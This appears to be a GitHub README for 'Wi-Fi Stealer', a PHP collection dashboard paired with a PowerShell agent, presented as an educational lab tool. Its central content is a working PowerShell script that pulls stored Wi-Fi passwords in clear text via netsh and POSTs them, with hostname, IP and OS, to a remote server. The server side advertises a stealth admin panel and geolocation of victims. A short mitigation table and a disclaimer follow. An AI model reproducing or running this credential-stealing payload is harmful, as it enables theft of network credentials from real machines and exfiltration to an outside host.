<p align="center">
  <img src="https://raw.githubusercontent.com/Zypher17/wifi-stealer/main/WEB_SERVER_PICTURE.png" alt="Wi-Fi Stealer Banner" width="850" style="border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
</p>

<h1 align="center">⚡ Wi-Fi Stealer & Security Auditing Suite</h1>

<p align="center">
  <b>A lightweight, multi-tenant cybersecurity training tool designed to demonstrate Wi-Fi credential exfiltration risks and practical defensive auditing.</b>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/PHP-8.x-777BB4?style=for-the-badge&logo=php&logoColor=white" alt="PHP 8.x">
  <img src="https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=for-the-badge&logo=powershell&logoColor=white" alt="PowerShell">
  <img src="https://img.shields.io/badge/Security-Educational%20Only-f43f5e?style=for-the-badge" alt="Security Educational Only">
  <img src="https://img.shields.io/badge/License-MIT-emerald?style=for-the-badge" alt="MIT License">
  <img src="https://img.shields.io/github/stars/Zypher17/wifi-stealer?style=for-the-badge&color=yellow" alt="Stars">
</p>

---

## 📌 Overview

**Wi-Fi Stealer** is an educational red-team/blue-team simulation suite. It illustrates how unprivileged automated scripts (e.g., PowerShell) can query stored WLAN profiles via standard operating system commands, parse credentials, and forward telemetry to a secure ingestion listener.

Built specifically for **educational environments, cybersecurity competitions, and closed labs**, it includes a multi-tenant dashboard allowing students or users to analyze their captures in isolated workspaces without interfering with peers.

---

## 🚀 Key Highlights

- 🎨 **Modern Cyber Glassmorphic UI:** Sleek, high-contrast dark theme powered by Tailwind-like ergonomics and modern typography.
- 👥 **Multi-Tenant User Isolation:** Each user has their own private workspace and only sees their own captures.
- ⚡ **Instant Self-Registration:** Users can register an account in seconds without administrative bottlenecks.
- 🛡️ **Stealth Admin Control Panel:** Complete administrative oversight with user management, plain/hash password audits, capture telemetry, and real-time activity logging.
- 🔐 **Zero-Leak Login Screen:** No default passwords, sensitive tokens, or system details exposed on public authentication pages.
- 📊 **Security Strength Analytics:** Automatically flags weak passwords (short length, dictionary patterns, lack of complexity) in real time.
- 🗺️ **Geolocation & Network Telemetry:** Maps target coordinates and captures internal IP, external IP, and victim operating system version.

---

## 🧱 Architecture & File Layout

```ascii
wifi-stealer/
├── 📄 index.php         # User portal, authentication & isolated analytics
├── 🛡️ admin.php         # Stealth administrative dashboard & user management
├── 🔌 upload.php        # Ingestion API endpoint for PowerShell agents
├── ⚙️ users.json        # User profiles & role-based access controls
├── 📜 activity.log      # Centralized security audit and access trail
├── 🔒 .htaccess         # Hardened rules restricting access to sensitive assets
└── 📂 creds/            # User-isolated telemetry logs
    ├── user01_wifi_creds.log
    └── user02_wifi_creds.log
```

---

## 💻 Agent Execution (PowerShell)

The exfiltration payload is designed for closed-enclosure educational labs on Windows environments:

```powershell
# Example telemetry capture trigger
$userToken = "your_username"
$targetUrl = "http://your-server-ip/upload.php?token=$userToken"

# Extract WLAN profiles and forward
$profiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

foreach ($ssid in $profiles) {
    $info = netsh wlan show profile name="$ssid" key=clear
    $pass = ($info | Select-String "Key Content\s*:\s*(.+)$").Matches.Groups[1].Value
    if (-not $pass) { $pass = "(Not Found)" }
    
    $payload = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'),$env:COMPUTERNAME,$ssid,$pass,$((Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]),$((Get-CimInstance Win32_OperatingSystem).Caption)"
    Invoke-RestMethod -Uri $targetUrl -Method POST -Body $payload
}
```

---

## 🛠️ Quick Deployment

### Requirements
- **Web Server:** Apache, Nginx, or Caddy with PHP 8.0+
- **PHP Extensions:** `json`, `session`, `pcre`

### 1. Clone & Set Up
```bash
git clone https://github.com/Zypher17/wifi-stealer.git
cd wifi-stealer
```

### 2. Run Local Development Server
```bash
php -S 127.0.0.1:8080
```
Visit `http://127.0.0.1:8080` in your browser.

---

## 🛡️ Defensive Countermeasures (How to Mitigate)

This project is built to demonstrate attack surfaces so defenders can fortify endpoints:

| Attack Vector | Defense / Remediation |
|---|---|
| **Plaintext WLAN Profile Query** | Restrict unprivileged access to `netsh.exe` via AppLocker or Software Restriction Policies. |
| **Execution of Remote Scripts** | Enforce PowerShell `ConstrainedLanguageMode` and Signed Execution Policies (`AllSigned`). |
| **Egress Exfiltration** | Implement strict egress firewall filtering and DNS inspection for unauthorized POST endpoints. |
| **Stolen Shared Keys** | Implement enterprise **WPA3-Enterprise / 802.1X RADIUS** authentication with device certificates instead of static Pre-Shared Keys (PSK). |

---

## ⚠️ Ethical & Legal Disclaimer

> **IMPORTANT:** This repository is intended strictly for educational purposes, defensive security training, academic coursework, and authorized security assessments within controlled lab environments. Unauthorized access or credential harvesting against computing systems without explicit written permission from the system owner is illegal. The author assumes no liability for misuse.

---

<p align="center">
  Developed by <a href="https://github.com/Zypher17"><b>Zypher17</b></a> • Star ⭐ this repository if you find it helpful!
</p>
